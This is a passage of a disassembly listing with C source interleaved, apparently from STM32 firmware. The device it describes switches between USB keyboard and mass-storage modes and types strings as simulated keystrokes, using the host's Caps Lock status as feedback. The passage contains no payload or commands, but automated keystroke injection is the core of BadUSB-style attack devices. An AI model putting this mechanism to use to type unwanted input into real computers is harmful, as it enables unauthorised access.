    Error_Handler();
 800062c:	f000 fb0e 	bl	8000c4c <Error_Handler>
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000630:	f003 f8a4 	bl	800377c <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 8000634:	4b21      	ldr	r3, [pc, #132]	; (80006bc <SystemClock_Config+0xc0>)
 8000636:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800063a:	4a20      	ldr	r2, [pc, #128]	; (80006bc <SystemClock_Config+0xc0>)
 800063c:	f023 0318 	bic.w	r3, r3, #24
 8000640:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 8000644:	2314      	movs	r3, #20
 8000646:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 8000648:	2301      	movs	r3, #1
 800064a:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 800064c:	2301      	movs	r3, #1
 800064e:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 8000650:	2300      	movs	r3, #0
 8000652:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 8000654:	2360      	movs	r3, #96	; 0x60
 8000656:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 8000658:	2302      	movs	r3, #2
 800065a:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 800065c:	2301      	movs	r3, #1
 800065e:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 8000660:	2301      	movs	r3, #1
 8000662:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 8000664:	2318      	movs	r3, #24
 8000666:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 8000668:	2307      	movs	r3, #7
 800066a:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 800066c:	2302      	movs	r3, #2
 800066e:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 8000670:	2302      	movs	r3, #2
 8000672:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 8000674:	f107 0314 	add.w	r3, r7, #20
 8000678:	4618      	mov	r0, r3
 800067a:	f003 f903 	bl	8003884 <HAL_RCC_OscConfig>
 800067e:	4603      	mov	r3, r0
 8000680:	2b00      	cmp	r3, #0
 8000682:	d001      	beq.n	8000688 <SystemClock_Config+0x8c>
  {
    Error_Handler();
 8000684:	f000 fae2 	bl	8000c4c <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 8000688:	230f      	movs	r3, #15
 800068a:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 800068c:	2303      	movs	r3, #3
 800068e:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 8000690:	2300      	movs	r3, #0
 8000692:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 8000694:	2300      	movs	r3, #0
 8000696:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 8000698:	2300      	movs	r3, #0
 800069a:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 800069c:	463b      	mov	r3, r7
 800069e:	2102      	movs	r1, #2
 80006a0:	4618      	mov	r0, r3
 80006a2:	f003 fd03 	bl	80040ac <HAL_RCC_ClockConfig>
 80006a6:	4603      	mov	r3, r0
 80006a8:	2b00      	cmp	r3, #0
 80006aa:	d001      	beq.n	80006b0 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 80006ac:	f000 face 	bl	8000c4c <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 80006b0:	f004 f916 	bl	80048e0 <HAL_RCCEx_EnableMSIPLLMode>
}
 80006b4:	bf00      	nop
 80006b6:	3758      	adds	r7, #88	; 0x58
 80006b8:	46bd      	mov	sp, r7
 80006ba:	bd80      	pop	{r7, pc}
 80006bc:	40021000 	.word	0x40021000

080006c0 <SimulateUSB_unplug>:

/* USER CODE BEGIN 4 */
void SimulateUSB_unplug(){
 80006c0:	b580      	push	{r7, lr}
 80006c2:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 80006c4:	2200      	movs	r2, #0
 80006c6:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 80006ca:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80006ce:	f001 fa79 	bl	8001bc4 <HAL_GPIO_WritePin>
}
 80006d2:	bf00      	nop
 80006d4:	bd80      	pop	{r7, pc}

080006d6 <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 80006d6:	b580      	push	{r7, lr}
 80006d8:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 80006da:	2201      	movs	r2, #1
 80006dc:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 80006e0:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80006e4:	f001 fa6e 	bl	8001bc4 <HAL_GPIO_WritePin>
}
 80006e8:	bf00      	nop
 80006ea:	bd80      	pop	{r7, pc}

080006ec <SwitchToHID>:

void SwitchToHID(){
 80006ec:	b580      	push	{r7, lr}
 80006ee:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 80006f0:	f7ff ffe6 	bl	80006c0 <SimulateUSB_unplug>
	isMSC = 0;
 80006f4:	4b06      	ldr	r3, [pc, #24]	; (8000710 <SwitchToHID+0x24>)
 80006f6:	2200      	movs	r2, #0
 80006f8:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 80006fa:	2032      	movs	r0, #50	; 0x32
 80006fc:	f000 fd4a 	bl	8001194 <HAL_Delay>
	SimulateUSB_plugin();
 8000700:	f7ff ffe9 	bl	80006d6 <SimulateUSB_plugin>
	MX_TIM2_Init();
 8000704:	f000 fb9c 	bl	8000e40 <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 8000708:	f00b fe16 	bl	800c338 <MX_USB_DEVICE_Init>
}
 800070c:	bf00      	nop
 800070e:	bd80      	pop	{r7, pc}
 8000710:	20000978 	.word	0x20000978

08000714 <SwitchToMSC>:

void SwitchToMSC(){
 8000714:	b580      	push	{r7, lr}
 8000716:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000718:	f7ff ffd2 	bl	80006c0 <SimulateUSB_unplug>
	isMSC = 1;
 800071c:	4b07      	ldr	r3, [pc, #28]	; (800073c <SwitchToMSC+0x28>)
 800071e:	2201      	movs	r2, #1
 8000720:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 8000722:	2032      	movs	r0, #50	; 0x32
 8000724:	f000 fd36 	bl	8001194 <HAL_Delay>
	SimulateUSB_plugin();
 8000728:	f7ff ffd5 	bl	80006d6 <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 800072c:	f00b fe34 	bl	800c398 <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(PlugSlot*10);
 8000730:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8000734:	f000 fd2e 	bl	8001194 <HAL_Delay>
}
 8000738:	bf00      	nop
 800073a:	bd80      	pop	{r7, pc}
 800073c:	20000978 	.word	0x20000978

08000740 <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 8000740:	b580      	push	{r7, lr}
 8000742:	b0a4      	sub	sp, #144	; 0x90
 8000744:	af00      	add	r7, sp, #0
 8000746:	4603      	mov	r3, r0
 8000748:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800074a:	220f      	movs	r2, #15
 800074c:	2100      	movs	r1, #0
 800074e:	4821      	ldr	r0, [pc, #132]	; (80007d4 <Get_Single_Descriptor+0x94>)
 8000750:	f00c fc2a 	bl	800cfa8 <memset>
	uint8_t Map[MapLen] = Map_Init;
 8000754:	4a20      	ldr	r2, [pc, #128]	; (80007d8 <Get_Single_Descriptor+0x98>)
 8000756:	f107 0308 	add.w	r3, r7, #8
 800075a:	4611      	mov	r1, r2
 800075c:	2285      	movs	r2, #133	; 0x85
 800075e:	4618      	mov	r0, r3
 8000760:	f00c fc4e 	bl	800d000 <memcpy>
	Convert2CapsMap(Map);
 8000764:	f107 0308 	add.w	r3, r7, #8
 8000768:	4618      	mov	r0, r3
 800076a:	f000 f93d 	bl	80009e8 <Convert2CapsMap>
	uint8_t pos = Map[ascii];
 800076e:	79fb      	ldrb	r3, [r7, #7]
 8000770:	3390      	adds	r3, #144	; 0x90
 8000772:	443b      	add	r3, r7
 8000774:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 8000778:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 800077c:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000780:	091b      	lsrs	r3, r3, #4
 8000782:	b2db      	uxtb	r3, r3
 8000784:	461a      	mov	r2, r3
 8000786:	4b13      	ldr	r3, [pc, #76]	; (80007d4 <Get_Single_Descriptor+0x94>)
 8000788:	5c9b      	ldrb	r3, [r3, r2]
 800078a:	b25a      	sxtb	r2, r3
 800078c:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000790:	f003 0307 	and.w	r3, r3, #7
 8000794:	2101      	movs	r1, #1
 8000796:	fa01 f303 	lsl.w	r3, r1, r3
 800079a:	b25b      	sxtb	r3, r3
 800079c:	4313      	orrs	r3, r2
 800079e:	b259      	sxtb	r1, r3
 80007a0:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007a4:	091b      	lsrs	r3, r3, #4
 80007a6:	b2db      	uxtb	r3, r3
 80007a8:	461a      	mov	r2, r3
 80007aa:	b2c9      	uxtb	r1, r1
 80007ac:	4b09      	ldr	r3, [pc, #36]	; (80007d4 <Get_Single_Descriptor+0x94>)
 80007ae:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 80007b0:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007b4:	f003 0308 	and.w	r3, r3, #8
 80007b8:	2b00      	cmp	r3, #0
 80007ba:	d006      	beq.n	80007ca <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 80007bc:	4b05      	ldr	r3, [pc, #20]	; (80007d4 <Get_Single_Descriptor+0x94>)
 80007be:	781b      	ldrb	r3, [r3, #0]
 80007c0:	f043 0302 	orr.w	r3, r3, #2
 80007c4:	b2da      	uxtb	r2, r3
 80007c6:	4b03      	ldr	r3, [pc, #12]	; (80007d4 <Get_Single_Descriptor+0x94>)
 80007c8:	701a      	strb	r2, [r3, #0]
}
 80007ca:	bf00      	nop
 80007cc:	3790      	adds	r7, #144	; 0x90
 80007ce:	46bd      	mov	sp, r7
 80007d0:	bd80      	pop	{r7, pc}
 80007d2:	bf00      	nop
 80007d4:	2000025c 	.word	0x2000025c
 80007d8:	0800d034 	.word	0x0800d034

080007dc <Get_Multi_Descriptor>:

void Get_Multi_Descriptor(uint8_t *array, int num){
 80007dc:	b580      	push	{r7, lr}
 80007de:	b0a6      	sub	sp, #152	; 0x98
 80007e0:	af00      	add	r7, sp, #0
 80007e2:	6078      	str	r0, [r7, #4]
 80007e4:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80007e6:	220f      	movs	r2, #15
 80007e8:	2100      	movs	r1, #0
 80007ea:	482a      	ldr	r0, [pc, #168]	; (8000894 <Get_Multi_Descriptor+0xb8>)
 80007ec:	f00c fbdc 	bl	800cfa8 <memset>
	uint8_t Map[MapLen] = Map_Init;
 80007f0:	4a29      	ldr	r2, [pc, #164]	; (8000898 <Get_Multi_Descriptor+0xbc>)
 80007f2:	f107 030c 	add.w	r3, r7, #12
 80007f6:	4611      	mov	r1, r2
 80007f8:	2285      	movs	r2, #133	; 0x85
 80007fa:	4618      	mov	r0, r3
 80007fc:	f00c fc00 	bl	800d000 <memcpy>
	Convert2CapsMap(Map);
 8000800:	f107 030c 	add.w	r3, r7, #12
 8000804:	4618      	mov	r0, r3
 8000806:	f000 f8ef 	bl	80009e8 <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 800080a:	2300      	movs	r3, #0
 800080c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000810:	e036      	b.n	8000880 <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 8000812:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 8000816:	687a      	ldr	r2, [r7, #4]
 8000818:	4413      	add	r3, r2
 800081a:	781b      	ldrb	r3, [r3, #0]
 800081c:	3398      	adds	r3, #152	; 0x98
 800081e:	443b      	add	r3, r7
 8000820:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 8000824:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 8000828:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800082c:	091b      	lsrs	r3, r3, #4
 800082e:	b2db      	uxtb	r3, r3
 8000830:	461a      	mov	r2, r3
 8000832:	4b18      	ldr	r3, [pc, #96]	; (8000894 <Get_Multi_Descriptor+0xb8>)
 8000834:	5c9b      	ldrb	r3, [r3, r2]
 8000836:	b25a      	sxtb	r2, r3
 8000838:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800083c:	f003 0307 	and.w	r3, r3, #7
 8000840:	2101      	movs	r1, #1
 8000842:	fa01 f303 	lsl.w	r3, r1, r3
 8000846:	b25b      	sxtb	r3, r3
 8000848:	4313      	orrs	r3, r2
 800084a:	b259      	sxtb	r1, r3
 800084c:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000850:	091b      	lsrs	r3, r3, #4
 8000852:	b2db      	uxtb	r3, r3
 8000854:	461a      	mov	r2, r3
 8000856:	b2c9      	uxtb	r1, r1
 8000858:	4b0e      	ldr	r3, [pc, #56]	; (8000894 <Get_Multi_Descriptor+0xb8>)
 800085a:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 800085c:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000860:	f003 0308 	and.w	r3, r3, #8
 8000864:	2b00      	cmp	r3, #0
 8000866:	d006      	beq.n	8000876 <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 8000868:	4b0a      	ldr	r3, [pc, #40]	; (8000894 <Get_Multi_Descriptor+0xb8>)
 800086a:	781b      	ldrb	r3, [r3, #0]
 800086c:	f043 0302 	orr.w	r3, r3, #2
 8000870:	b2da      	uxtb	r2, r3
 8000872:	4b08      	ldr	r3, [pc, #32]	; (8000894 <Get_Multi_Descriptor+0xb8>)
 8000874:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 8000876:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 800087a:	3301      	adds	r3, #1
 800087c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000880:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 8000884:	683b      	ldr	r3, [r7, #0]
 8000886:	429a      	cmp	r2, r3
 8000888:	dbc3      	blt.n	8000812 <Get_Multi_Descriptor+0x36>
	}
}
 800088a:	bf00      	nop
 800088c:	bf00      	nop
 800088e:	3798      	adds	r7, #152	; 0x98
 8000890:	46bd      	mov	sp, r7
 8000892:	bd80      	pop	{r7, pc}
 8000894:	2000025c 	.word	0x2000025c
 8000898:	0800d034 	.word	0x0800d034

0800089c <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 800089c:	b580      	push	{r7, lr}
 800089e:	b082      	sub	sp, #8
 80008a0:	af00      	add	r7, sp, #0
 80008a2:	4603      	mov	r3, r0
 80008a4:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 80008a6:	79fb      	ldrb	r3, [r7, #7]
 80008a8:	4618      	mov	r0, r3
 80008aa:	f7ff ff49 	bl	8000740 <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008ae:	220f      	movs	r2, #15
 80008b0:	4903      	ldr	r1, [pc, #12]	; (80008c0 <SimulateKeyPress+0x24>)
 80008b2:	4804      	ldr	r0, [pc, #16]	; (80008c4 <SimulateKeyPress+0x28>)
 80008b4:	f008 f87e 	bl	80089b4 <USBD_CUSTOM_HID_SendReport>
}
 80008b8:	bf00      	nop
 80008ba:	3708      	adds	r7, #8
 80008bc:	46bd      	mov	sp, r7
 80008be:	bd80      	pop	{r7, pc}
 80008c0:	2000025c 	.word	0x2000025c
 80008c4:	200003c0 	.word	0x200003c0

080008c8 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 80008c8:	b580      	push	{r7, lr}
 80008ca:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008cc:	220f      	movs	r2, #15
 80008ce:	2100      	movs	r1, #0
 80008d0:	4804      	ldr	r0, [pc, #16]	; (80008e4 <SimulateKeyRelease+0x1c>)
 80008d2:	f00c fb69 	bl	800cfa8 <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008d6:	220f      	movs	r2, #15
 80008d8:	4902      	ldr	r1, [pc, #8]	; (80008e4 <SimulateKeyRelease+0x1c>)
 80008da:	4803      	ldr	r0, [pc, #12]	; (80008e8 <SimulateKeyRelease+0x20>)
 80008dc:	f008 f86a 	bl	80089b4 <USBD_CUSTOM_HID_SendReport>
}
 80008e0:	bf00      	nop
 80008e2:	bd80      	pop	{r7, pc}
 80008e4:	2000025c 	.word	0x2000025c
 80008e8:	200003c0 	.word	0x200003c0

080008ec <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 80008ec:	b580      	push	{r7, lr}
 80008ee:	b082      	sub	sp, #8
 80008f0:	af00      	add	r7, sp, #0
 80008f2:	4603      	mov	r3, r0
 80008f4:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 80008f6:	79fb      	ldrb	r3, [r7, #7]
 80008f8:	4618      	mov	r0, r3
 80008fa:	f7ff ffcf 	bl	800089c <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 80008fe:	2023      	movs	r0, #35	; 0x23
 8000900:	f000 fc48 	bl	8001194 <HAL_Delay>
	SimulateKeyRelease();
 8000904:	f7ff ffe0 	bl	80008c8 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000908:	2023      	movs	r0, #35	; 0x23
 800090a:	f000 fc43 	bl	8001194 <HAL_Delay>
}
 800090e:	bf00      	nop
 8000910:	3708      	adds	r7, #8
 8000912:	46bd      	mov	sp, r7
 8000914:	bd80      	pop	{r7, pc}
	...

08000918 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 8000918:	b580      	push	{r7, lr}
 800091a:	b082      	sub	sp, #8
 800091c:	af00      	add	r7, sp, #0
 800091e:	6078      	str	r0, [r7, #4]
 8000920:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 8000922:	6839      	ldr	r1, [r7, #0]
 8000924:	6878      	ldr	r0, [r7, #4]
 8000926:	f7ff ff59 	bl	80007dc <Get_Multi_Descriptor>
	while((recv_buffer[0]&0x02) != 0x02){
 800092a:	e002      	b.n	8000932 <SimulateShortcutKey+0x1a>
		SimulateKeyStroke(128);
 800092c:	2080      	movs	r0, #128	; 0x80
 800092e:	f7ff ffdd 	bl	80008ec <SimulateKeyStroke>
	while((recv_buffer[0]&0x02) != 0x02){
 8000932:	4b0c      	ldr	r3, [pc, #48]	; (8000964 <SimulateShortcutKey+0x4c>)
 8000934:	781b      	ldrb	r3, [r3, #0]
 8000936:	f003 0302 	and.w	r3, r3, #2
 800093a:	2b00      	cmp	r3, #0
 800093c:	d0f6      	beq.n	800092c <SimulateShortcutKey+0x14>
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800093e:	220f      	movs	r2, #15
 8000940:	4909      	ldr	r1, [pc, #36]	; (8000968 <SimulateShortcutKey+0x50>)
 8000942:	480a      	ldr	r0, [pc, #40]	; (800096c <SimulateShortcutKey+0x54>)
 8000944:	f008 f836 	bl	80089b4 <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000948:	2023      	movs	r0, #35	; 0x23
 800094a:	f000 fc23 	bl	8001194 <HAL_Delay>
	SimulateKeyRelease();
 800094e:	f7ff ffbb 	bl	80008c8 <SimulateKeyRelease>
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
 8000952:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8000956:	f000 fc1d 	bl	8001194 <HAL_Delay>
}
 800095a:	bf00      	nop
 800095c:	3708      	adds	r7, #8
 800095e:	46bd      	mov	sp, r7
 8000960:	bd80      	pop	{r7, pc}
 8000962:	bf00      	nop
 8000964:	2000026c 	.word	0x2000026c
 8000968:	2000025c 	.word	0x2000025c
 800096c:	200003c0 	.word	0x200003c0

08000970 <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 8000970:	b580      	push	{r7, lr}
 8000972:	b084      	sub	sp, #16
 8000974:	af00      	add	r7, sp, #0
 8000976:	60f8      	str	r0, [r7, #12]
 8000978:	60b9      	str	r1, [r7, #8]
 800097a:	607a      	str	r2, [r7, #4]
	for(; *cntNow < len; (*cntNow)++){
 800097c:	e025      	b.n	80009ca <SimulateKeyStrokes+0x5a>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 800097e:	4b18      	ldr	r3, [pc, #96]	; (80009e0 <SimulateKeyStrokes+0x70>)
 8000980:	781b      	ldrb	r3, [r3, #0]
 8000982:	f003 0302 	and.w	r3, r3, #2
 8000986:	2b00      	cmp	r3, #0
 8000988:	d102      	bne.n	8000990 <SimulateKeyStrokes+0x20>
			SimulateKeyStroke(128);
 800098a:	2080      	movs	r0, #128	; 0x80
 800098c:	f7ff ffae 	bl	80008ec <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 8000990:	687b      	ldr	r3, [r7, #4]
 8000992:	681b      	ldr	r3, [r3, #0]
 8000994:	461a      	mov	r2, r3
 8000996:	68fb      	ldr	r3, [r7, #12]
 8000998:	4413      	add	r3, r2
 800099a:	781b      	ldrb	r3, [r3, #0]
 800099c:	4618      	mov	r0, r3
 800099e:	f7ff ffa5 	bl	80008ec <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 80009a2:	4b10      	ldr	r3, [pc, #64]	; (80009e4 <SimulateKeyStrokes+0x74>)
 80009a4:	681b      	ldr	r3, [r3, #0]
 80009a6:	2b01      	cmp	r3, #1
 80009a8:	d10a      	bne.n	80009c0 <SimulateKeyStrokes+0x50>
			NeedRollBack = 0;
 80009aa:	4b0e      	ldr	r3, [pc, #56]	; (80009e4 <SimulateKeyStrokes+0x74>)
 80009ac:	2200      	movs	r2, #0
 80009ae:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 80009b0:	687b      	ldr	r3, [r7, #4]
 80009b2:	681b      	ldr	r3, [r3, #0]
 80009b4:	1e5a      	subs	r2, r3, #1
 80009b6:	687b      	ldr	r3, [r7, #4]
 80009b8:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 80009ba:	2081      	movs	r0, #129	; 0x81
 80009bc:	f7ff ff96 	bl	80008ec <SimulateKeyStroke>
	for(; *cntNow < len; (*cntNow)++){
 80009c0:	687b      	ldr	r3, [r7, #4]
 80009c2:	681b      	ldr	r3, [r3, #0]
 80009c4:	1c5a      	adds	r2, r3, #1
 80009c6:	687b      	ldr	r3, [r7, #4]
 80009c8:	601a      	str	r2, [r3, #0]
 80009ca:	687b      	ldr	r3, [r7, #4]
 80009cc:	681b      	ldr	r3, [r3, #0]
 80009ce:	68ba      	ldr	r2, [r7, #8]
 80009d0:	429a      	cmp	r2, r3
 80009d2:	dcd4      	bgt.n	800097e <SimulateKeyStrokes+0xe>
		}
	}
}
 80009d4:	bf00      	nop
 80009d6:	bf00      	nop
 80009d8:	3710      	adds	r7, #16
 80009da:	46bd      	mov	sp, r7
 80009dc:	bd80      	pop	{r7, pc}
 80009de:	bf00      	nop
 80009e0:	2000026c 	.word	0x2000026c
 80009e4:	2000027c 	.word	0x2000027c

080009e8 <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 80009e8:	b480      	push	{r7}
 80009ea:	b085      	sub	sp, #20
 80009ec:	af00      	add	r7, sp, #0
 80009ee:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 80009f0:	2341      	movs	r3, #65	; 0x41
 80009f2:	73fb      	strb	r3, [r7, #15]
 80009f4:	e01a      	b.n	8000a2c <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 80009f6:	7bfb      	ldrb	r3, [r7, #15]
 80009f8:	687a      	ldr	r2, [r7, #4]
 80009fa:	4413      	add	r3, r2
 80009fc:	781a      	ldrb	r2, [r3, #0]
 80009fe:	7bfb      	ldrb	r3, [r7, #15]
 8000a00:	6879      	ldr	r1, [r7, #4]
 8000a02:	440b      	add	r3, r1
 8000a04:	f022 0208 	bic.w	r2, r2, #8
 8000a08:	b2d2      	uxtb	r2, r2
 8000a0a:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 8000a0c:	7bfb      	ldrb	r3, [r7, #15]
 8000a0e:	3320      	adds	r3, #32
 8000a10:	687a      	ldr	r2, [r7, #4]
 8000a12:	4413      	add	r3, r2
 8000a14:	781a      	ldrb	r2, [r3, #0]
 8000a16:	7bfb      	ldrb	r3, [r7, #15]
 8000a18:	3320      	adds	r3, #32
 8000a1a:	6879      	ldr	r1, [r7, #4]
 8000a1c:	440b      	add	r3, r1
 8000a1e:	f042 0208 	orr.w	r2, r2, #8
 8000a22:	b2d2      	uxtb	r2, r2
 8000a24:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a26:	7bfb      	ldrb	r3, [r7, #15]
 8000a28:	3301      	adds	r3, #1
 8000a2a:	73fb      	strb	r3, [r7, #15]
 8000a2c:	7bfb      	ldrb	r3, [r7, #15]
 8000a2e:	2b5a      	cmp	r3, #90	; 0x5a
 8000a30:	d9e1      	bls.n	80009f6 <Convert2CapsMap+0xe>
	}
}
 8000a32:	bf00      	nop
 8000a34:	bf00      	nop
 8000a36:	3714      	adds	r7, #20
 8000a38:	46bd      	mov	sp, r7
 8000a3a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000a3e:	4770      	bx	lr

08000a40 <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000a40:	b580      	push	{r7, lr}
 8000a42:	b082      	sub	sp, #8
 8000a44:	af00      	add	r7, sp, #0
 8000a46:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 8000a48:	687b      	ldr	r3, [r7, #4]
 8000a4a:	681b      	ldr	r3, [r3, #0]
 8000a4c:	2b01      	cmp	r3, #1
 8000a4e:	d10f      	bne.n	8000a70 <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000a50:	687b      	ldr	r3, [r7, #4]
 8000a52:	2200      	movs	r2, #0
 8000a54:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
 8000a56:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000a5a:	695b      	ldr	r3, [r3, #20]
 8000a5c:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
